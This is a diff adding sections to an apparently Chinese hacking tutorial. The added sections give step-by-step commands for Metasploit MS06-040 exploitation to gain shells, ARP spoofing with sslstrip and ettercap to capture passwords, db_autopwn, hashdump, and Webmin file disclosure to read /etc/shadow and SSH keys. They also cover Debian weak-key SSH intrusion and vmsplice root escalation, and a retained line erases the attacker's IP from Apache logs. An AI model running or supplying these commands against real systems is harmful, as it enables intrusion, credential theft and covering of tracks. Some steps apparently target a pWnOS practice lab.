@@ -6,7 +6,10 @@
 * [五、RCE远程代码执行演示](#五、RCE远程代码执行演示) 
 * [六、被动OS探测,http嗅探,SSL嗅探](#六、被动OS探测,http嗅探,SSL嗅探)
 * [七、利用CGI漏洞入侵,提权,装后门,清日志](#七、利用CGI漏洞入侵,提权,装后门,清日志)
-* [八、利用Metasploit Framework远程拿下服务器](#八、利用Metasploit Framework远程拿下服务器)
+* [八、利用MetasploitFramework远程拿下服务器](#八、利用MetasploitFramework远程拿下服务器)
+* [九、利用sslstrip和ettercap交换机环境下突破ssl嗅探密码](#九、利用sslstrip和ettercap交换机环境下突破ssl嗅探密码)
+* [十、通过backtrack平台,利用Metasploit入侵windows平台](#十、通过backtrack平台,利用Metasploit入侵windows平台)
+* [十一、通过backtrack平台：扫描,入侵,提权](#十一、通过backtrack平台：扫描,入侵,提权)
 
 
 ***
@@ -259,12 +262,111 @@ cd /etc/httpd/logs/
 sed -i '/115.60.133.168/d' access_log*
 注：清理Apache日志，删除带有自己IP的条目
 ```
-### 八、利用Metasploit Framework远程拿下服务器
+### 八、利用MetasploitFramework远程拿下服务器
+利用MS06_040远程拿下服务器（漏洞利用端口为445，即文件共享端口）
+Microsoft Windows Server service Remote Buffer Overflow Vulnerability
+```
+msfcli exploit/windows/smb/ms06_040_netapi payload=windows/shell/bind_tcp RHOST=[目标主机IP] E
+注：Kali2.0使用下面的命令执行攻击
+msfconsole -x "use exploit/windows/smb/ms06_040_netapi; set RHOST [目标主机IP]; set PAYLOAD windows/shell/bind_tcp;  run" 
 
+执行后获得shell
+```
+### 九、利用sslstrip和ettercap交换机环境下突破ssl嗅探密码
+进行arp欺骗，突破经过ssl加密的协议
+```
+    wget http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz
+    注：下载sslstrip
+    python setup.py install
 
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+    注：通过iptables把所有http数据导入到10000端口，并用sslstrip监听10000端口，得到想要的数据
+    sslstrip -l 10000
+    注：会在当前目录生成sslstrip.log
+    
+    ettercap -T -q -M arp:remote /192.168.1.101/ //
+    注：192.168.1.101为目标IP，等待目标主机访问网页（如：登录google邮箱）
+```
+### 十、通过backtrack平台,利用Metasploit入侵windows平台
+```
+    msfconsole
+    db_create g0tmilk
+    db_hosts
+    db_add_host 10.0.0.4
+    db_hosts
+    use windows/smb/ms06_040_netapi
+    set payload windows/vncinject/bind_tcp
+    show options
+    set RHOST 10.0.0.4
+    show options
+    exploit
+    注：成功，显示vnc界面
 
+    db_del_host 10.0.0.4
+    db_nmap -n 0 10.0.0.1-5
+    db_hosts
+    db_autopwn -t -p -e -R great 
+    sessions -l
+    session -i 2
+    注：成功，进入shell
 
+    sysinfo
+    idletime
+    ps
+    kill 184
+    getuid
+    hashdump
+    shell
+```
+### 十一、通过backtrack平台：扫描,入侵,提权
+```
+    nmap 192.168.3.1-255
+    注：扫描主机及端口
+    nmap -sS -sV -0 192.168.3.100
+    注：指定主机，每个端口对应的服务类型和版本
+    firefox 192.168.3.100
+    注：打开firefox，网址为192.168.3.100
+    firefox 192.168.3.100:10000
+    注，打开网址（如：端口10000对应的后台服务为Webmin httpd）
 
+    www.exploit-db.com->search->Description[Webmin]->选中Webmin<1.290 /Usermin <1.220 Arbitrary File Disclosure Exploit(perl)->Exploit Code->下载Webmin.pl
+    或命令行：searchsploit webmin
+    注：根据nmap扫描结果webmin，exploit-db查询漏洞利用模块
 
+    chmod 777 Webmin.pl
+    perl Webmin.pl 192.168.3.100 10000 /etc/shadow 0
+    注：得到目标主机上的用户名
+    perl Webmin.pl 192.168.3.100 10000 /home/vmware/.ssh/authorized_keys 0
+    注：根据目标主机上的用户名得到ssh的登录信息
 
+    https://127.0.0.1:8834
+    注：打开nessus网页
+    Policies->Add->General->Name[pWnOS]，Visibility[Shared]，Descirption[pWnOS v1]->Credentials->Plugins->Brute force attacks，Gain a shell remotely，General，Misc，Service detection，Ubuntu Local Security Checks，Web Servers->Preferences->Submit
+    Scans->Add->Name[g0tmild]，Policy[pWnOS]，Scan Targets[192.168.3.100]->Launch
+    Reports->得到ssh端口22存在风险
 
+    www.exploit-db.com->search->Description[OpenSSL]->选中DebianOpenSSL Predictable PRNG Bruteforce SSH Exploit->下载http://milw0rm.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2
+    或命令行：searchsploit OpenSSL
+    注：根据nessus扫描结果，exploit-db查询漏洞利用模块
+
+    tar jxvf debian_ssh_rsa_2048_x86.tar.bz2
+    cd rsa/2048/
+    grep -lr [perl Webmin得到的ssh秘钥] *.pub
+    注：得到该用户的公钥
+    ssh -i [该用户的公钥] vmware@192.168.3.100
+    注：成功，进入到shell
+
+    hostname
+    uname -a
+    注：得到目标主机的linux版本，如2.6版本
+
+    www.exploit-db.com->search->Description[Linux Kernel 2.6]->选中Linux Kernel 2.6.17 - 2.6.24.1 vmsplice Local Root Exploit->复制代码
+    或命令行：searchsploit Linux Kernel 2.6
+    注：根据uname -a结果，exploit-db查询漏洞利用模块
+
+    vi vmsplice.c（粘贴上面exploit-db的代码）
+    gcc vmsplice.c -o vmsplice
+    ./vmsplice
+    注：登录到目标主机的vwmare用户提升为root用户
+```
